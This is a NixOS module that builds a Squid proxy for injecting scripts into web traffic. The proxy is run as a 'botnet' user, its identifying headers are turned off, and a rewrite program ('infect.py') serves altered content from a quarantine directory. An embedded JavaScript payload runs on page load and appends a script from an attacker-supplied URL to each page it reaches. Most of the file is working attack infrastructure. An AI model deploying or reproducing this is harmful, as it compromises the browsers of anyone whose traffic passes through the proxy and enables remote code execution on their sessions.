{ payloadUrl }:

{ pkgs, ... }:

let

  configFile = pkgs.writeText "squid.conf" ''
    http_port 3128

    acl all src all

    acl SSL_ports port 443
    acl Safe_ports port 80		# http
    acl Safe_ports port 21		# ftp
    acl Safe_ports port 443		# https
    acl Safe_ports port 70		# gopher
    acl Safe_ports port 210		# wais
    acl Safe_ports port 1025-65535	# unregistered ports
    acl Safe_ports port 280		# http-mgmt
    acl Safe_ports port 488		# gss-http
    acl Safe_ports port 591		# filemaker
    acl Safe_ports port 777		# multiling http
    acl CONNECT method CONNECT

    http_access deny !Safe_ports
    http_access deny CONNECT !SSL_ports

    http_access allow localhost
    http_access deny all

    forwarded_for off
    via off

    access_log daemon:/var/log/squid/access.log squid
    cache_log /var/log/squid/cache.log squid
    pid_filename /run/squid/pid
    cache_effective_user botnet

    url_rewrite_program ${pkgs.python3}/bin/python ${./infect.py} ${payload} /var/quarantine 13337
  '';

  payload = builtins.toFile "payload.js" ''
    (function(){
      function payload() {
        if (!window.__OWNED__) {
            window.__OWNED__ = true;
            var script = document.createElement('script');
            script.setAttribute('src', '${payloadUrl}');
            document.getElementsByTagName('html')[0].appendChild(script);
        }
      }
      if (window.addEventListener) {
        window.addEventListener('load', payload)
      } else {
        window.attachEvent('onload', payload)
      }
    })();
  '';

in {

  users.extraUsers.botnet = {
    group = "botnet";
    uid = 1337;
  };

  users.extraGroups.botnet = {
    gid = 1337;
  };

  networking.firewall.allowedTCPPorts = [
    80 3128
  ];

  services.httpd = {
    enable = true;
    user = "botnet";
    group = "botnet";
    adminAddr = "foo";
    virtualHosts = [
      {
        listen = [ { port = 80; } ];
        documentRoot = ./homepage;
      }
      {
        listen = [ { port = 13337; } ];
        documentRoot = "/var/quarantine";
      }
    ];
  };

  systemd.services.squid = {
    description = "Web Proxy Cache Server";
    after = [ "network.target" ];
    wantedBy = [ "multi-user.target" ];

    serviceConfig = {
      Type = "forking";
      PIDFile = "/run/squid/pid";
      ExecStart = "${pkgs.squid}/bin/squid -f ${configFile} -sYC";
      ExecStop = "${pkgs.squid}/bin/squid -f ${configFile} -k shutdown";
      ExecReload = "${pkgs.squid}/bin/squid -f ${configFile} -k reconfigure";
    };

    preStart = ''
      [ -d /var/quarantine ] && rm -r /var/quarantine
      mkdir -p /var/quarantine
      chown botnet /var/quarantine
      cp ${./htaccess} /var/quarantine/.htaccess

      mkdir -p /run/squid
      mkdir -p /var/log/squid
      chown botnet /run/squid
      chown botnet /var/log/squid
    '';

  };

}
